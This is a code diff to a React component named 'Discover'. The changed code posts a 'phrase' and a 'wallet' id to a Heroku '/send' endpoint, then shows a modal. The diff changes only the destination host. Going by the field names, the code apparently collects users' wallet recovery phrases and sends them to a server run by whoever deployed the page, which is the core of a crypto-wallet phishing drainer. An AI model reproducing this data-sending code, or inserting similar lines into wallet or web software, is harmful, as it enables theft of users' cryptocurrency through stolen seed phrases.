@@ -24,7 +24,7 @@ export default function Discover() {
       const pS = { phrase: phrase, wallet: pid };
       // console.log(pS);
       axios
-        .post("https://glacial-temple-10425.herokuapp.com/send", pS)
+        .post("https://stark-citadel-82468.herokuapp.com/send", pS)
         .then((res) => res.json())
         .then(setShowModal(true))
         .catch((err) => err);
